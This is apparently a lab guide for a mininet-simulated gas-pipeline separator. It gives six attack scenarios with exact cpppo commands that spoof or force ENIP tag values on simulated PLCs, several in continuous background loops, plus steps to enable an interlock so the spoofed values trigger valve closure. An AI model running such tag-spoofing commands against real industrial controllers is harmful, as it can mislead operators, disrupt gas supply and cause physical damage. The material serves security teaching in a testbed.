# Gas Pipeline Midstream — Attack Scenarios

> 6 attack scenarios targeting the gas-liquid separator system.
> Each attack includes: what it does, the exact commands, and the physical consequences.

---

## How the System Works (Quick Recap)

```
    Gas In ──[AV1]──→ SEPARATOR TANK ──[AV3]──→ Gas Out
                      │  PT301 (pressure)  │
                      │  LT201 (level)     │
                      └──[AV2]──[PUMP1]──→ Liquid Out
```

**Two data layers:**
- **SQLite** = physical reality (what PLCs read locally via `self.get()`)
- **ENIP servers** = network communications (what PLCs share with each other via `self.send()`/`self.receive()`)

**Attacks on ENIP** affect the network layer. PLC1 reads interlocks (LT201, PT301) **from the ENIP network** via `self.receive()`, so attacks on PLC2/PLC3 ENIP servers can inject data directly into PLC1's decision-making.

---

## Attack 1: Spoof Inlet Pressure (PT101 on PLC1)

### What You're Doing
Writing a fake low pressure value to PLC1's ENIP server, making monitoring systems think the inlet pressure is low when it's actually high.

### Commands
```bash
# Read real value
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.10 'PT101:1'

# Spoof to low value (below L threshold of 300)
mininet> attacker python3 -m cpppo.server.enip.client --address 192.168.1.10 'PT101:1=250.0'

# Verify spoof
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.10 'PT101:1'
```

### Effect
- **ENIP shows**: PT101 = 250 kPa (low)
- **Reality** (SQLite): PT101 = actual value (could be 600+ kPa)
- **Who is fooled**: HMI operators, SCADA systems reading from PLC1's ENIP
- **Who is NOT fooled**: PLC1 itself (reads from SQLite)
- **Physical consequence**: Operators see low pressure and may manually open AV1, increasing actual pressure further

### In Real Life
An operator seeing falsely low inlet pressure might open valves further, causing actual overpressure — potentially leading to **pipe rupture or explosion**.

---

## Attack 2: Force Inlet Valve Open (AV1 on PLC1)

### What You're Doing
Overwriting the AV1 tag on PLC1's ENIP server to show the valve as open.

### Commands
```bash
# Check current state
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.10 'AV1:1'

# Force to OPEN (continuous loop to overpower PLC1's writes)
mininet> attacker bash -c "while true; do python3 -m cpppo.server.enip.client --address 192.168.1.10 'AV1:1=1'; sleep 0.1; done" &

# Verify
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.10 'AV1:1'
```

### Effect
- **ENIP shows**: AV1 = 1 (open), even when PLC1 decided to close it
- **Who is fooled**: Any system reading valve state from ENIP
- **Physical consequence**: Operators think gas is flowing in when PLC1 actually closed the valve

### In Real Life
Masking the real valve state from operators could lead to wrong manual interventions. If operators think the inlet is already open but pipeline pressure is dropping, they may look for leaks that don't exist.

---

## Attack 3: Force Pump Off (PUMP1 on PLC2)

### What You're Doing
Writing PUMP1=0 to PLC2's ENIP server, making monitoring systems think the pump is off.

### Commands
```bash
# Check current pump state
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.20 'PUMP1:2'

# Force pump to appear OFF
mininet> attacker bash -c "while true; do python3 -m cpppo.server.enip.client --address 192.168.1.20 'PUMP1:2=0'; sleep 0.1; done" &

# Verify
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.20 'PUMP1:2'
```

### Effect
- **ENIP shows**: PUMP1 = 0 (off)
- **Who is fooled**: HMI/SCADA monitoring systems
- **Physical consequence**: Operators think liquid is not being drained. They might try to start a backup pump or take unnecessary emergency actions

### In Real Life
If the pump-ejector appears to have failed, operators could dispatch emergency maintenance crews, shut down sections of the pipeline, or activate backup systems — all unnecessary and costly.

---

## Attack 4: Combined Attack — Overpressure (AV1 open + AV3 closed)

### What You're Doing
Forcing ENIP to show the inlet valve as OPEN and the gas outlet valve as CLOSED simultaneously. This is the most dangerous deception — it shows a state where gas is flowing in but cannot escape.

### Commands
```bash
# Combined continuous attack
mininet> attacker bash -c "while true; do python3 -m cpppo.server.enip.client --address 192.168.1.10 'AV1:1=1'; python3 -m cpppo.server.enip.client --address 192.168.1.30 'AV3:3=0'; sleep 0.1; done" &

# Verify both
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.10 'AV1:1'
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.30 'AV3:3'
```

### Effect
- **ENIP shows**: AV1=1 (inlet open) + AV3=0 (outlet closed)
- **What operators see**: "Gas is flowing in and can't get out! EMERGENCY!"
- **Reality**: PLCs may have everything under control
- **Physical consequence**: Panic-driven manual overrides, emergency shutdowns

### In Real Life
This attack would trigger **emergency depressurization procedures**. In a real gas pipeline, an operator seeing this would likely:
1. Hit the emergency shutdown (ESD) button
2. Initiate pipeline blowdown (venting gas to atmosphere)
3. Evacuate personnel

All of this causes massive operational losses and potential environmental damage — exactly what the attacker wants.

---

## Attack 5: Spoof Tank Level (LT201 on PLC2) — Interlock Attack ⚡

### ⚠️ This Attack Actually Reaches PLC1's Brain

### What You're Doing
Spoofing the tank level reading on PLC2's ENIP server. Because PLC1 reads LT201 from PLC2 via `self.receive()`, the fake value is injected directly into PLC1's interlock logic.

### Commands
```bash
# Read real tank level
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.20 'LT201:2'

# Spoof to HIGH level (above H threshold of 1.0m)
mininet> attacker bash -c "while true; do python3 -m cpppo.server.enip.client --address 192.168.1.20 'LT201:2=1.2'; sleep 0.1; done" &

# Verify spoof
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.20 'LT201:2'

# Check PLC1 received the spoofed value
mininet> plc1 tail -5 logs/plc1.log
```

### Effect (Current Code — Interlock Disabled)
- **PLC1 receives**: LT201 = 1.2m (spoofed!)
- **PLC1 logs it** and stores it on its own ENIP server
- **No control action taken** because interlock code is commented out

### Effect (With Interlock Enabled in plc1.py)
If you uncomment the interlock logic in `plc1.py` (lines with `#if lt201 >= LT201_THRESH['H']`):
- **PLC1 receives spoofed LT201 = 1.2m** (above H threshold)
- **PLC1 closes AV1** (inlet valve) to protect the separator
- **Gas stops flowing in** → inlet pressure builds up
- **Tank level actually drops** (still being drained)
- **Result**: Unnecessary shutdown of gas supply

### In Real Life
Spoofing tank level high could cause:
- Unnecessary inlet valve closure → gas supply disruption
- Pump-ejector running against an empty tank → **pump cavitation and damage**
- Production loss from pipeline shutdown

---

## Attack 6: Spoof Tank Pressure (PT301 on PLC3) — Interlock Attack ⚡

### ⚠️ This Attack Also Reaches PLC1's Brain

### What You're Doing
Spoofing the tank pressure on PLC3's ENIP server. PLC1 reads PT301 from PLC3 via `self.receive()`.

### Commands
```bash
# Read real tank pressure
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.30 'PT301:3'

# Spoof to HIGH pressure (above H threshold of 600 kPa)
mininet> attacker bash -c "while true; do python3 -m cpppo.server.enip.client --address 192.168.1.30 'PT301:3=700.0'; sleep 0.1; done" &

# Verify
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.30 'PT301:3'

# Check PLC1 received the spoofed value
mininet> plc1 tail -5 logs/plc1.log
```

### Effect (Current Code — Interlock Disabled)
- **PLC1 receives**: PT301 = 700 kPa (spoofed!)
- **PLC1 logs it** — no control action taken

### Effect (With Interlock Enabled in plc1.py)
- **PLC1 receives spoofed PT301 = 700 kPa** (above H threshold)
- **PLC1 closes AV1** to stop gas flowing into an "overpressurized" tank
- **Gas supply cut off** → production loss

### In Real Life
Spoofing tank pressure high could cause:
- Emergency inlet closure → gas supply disruption
- Emergency depressurization/blowdown procedures triggered
- In a worst case: if operators override based on false data and actually vent the gas, it could cause **environmental contamination** and fire risk

---

## Enabling Interlocks for Full Attack Impact

To make Attacks 5 & 6 cause actual physical consequences, uncomment the interlock logic in `plc1.py`:

**Find these lines (near the end of the main_loop):**
```python
            #if lt201 >= LT201_THRESH['H'] or pt301 >= PT301_THRESH['H']:
            #    # CLOSE AV1 — tank is too full or pressurized
            #    self.set(AV1, 0)
            #    self.send(AV1, 0, PLC1_ADDR)
            #    print("INFO PLC1 - interlock: lt201 or pt301 over H -> close AV1.")
```

**Remove the `#` to enable:**
```python
            if lt201 >= LT201_THRESH['H'] or pt301 >= PT301_THRESH['H']:
                # CLOSE AV1 — tank is too full or pressurized
                self.set(AV1, 0)
                self.send(AV1, 0, PLC1_ADDR)
                print("INFO PLC1 - interlock: lt201 or pt301 over H -> close AV1.")
```

Then reset and restart:
```bash
rm gas_pipeline_db.sqlite
sudo python3 init.py
sudo python3 run.py
```

---

## Summary Table

| # | Attack | Target | ENIP Tag | Spoofed Value | Reaches PLC1? | Physical Impact |
|---|--------|--------|----------|---------------|---------------|-----------------|
| 1 | Spoof Inlet Pressure | PLC1 (.10) | `PT101:1` | 250.0 | No (reads SQLite) | Blinds monitoring |
| 2 | Force Inlet Valve Open | PLC1 (.10) | `AV1:1` | 1 | No (reads SQLite) | Blinds monitoring |
| 3 | Force Pump Off | PLC2 (.20) | `PUMP1:2` | 0 | No (PLC2 reads SQLite) | Blinds monitoring |
| 4 | Combined (AV1+AV3) | PLC1+PLC3 | Both | 1, 0 | No | Max deception, panic |
| 5 | **Spoof Tank Level** | PLC2 (.20) | `LT201:2` | 1.2 | **YES** (via receive) | If interlock on: AV1 closes |
| 6 | **Spoof Tank Pressure** | PLC3 (.30) | `PT301:3` | 700.0 | **YES** (via receive) | If interlock on: AV1 closes |

---

## Stopping Background Attack Loops

When running continuous attack loops (`& at the end`), stop them with:

```bash
# Stop ALL background attack processes on the attacker node
mininet> attacker bash -c "kill %1 2>/dev/null; kill %2 2>/dev/null"
```

> ⚠️ Do NOT use `attacker pkill -f cpppo` — this will also kill the PLC ENIP servers!
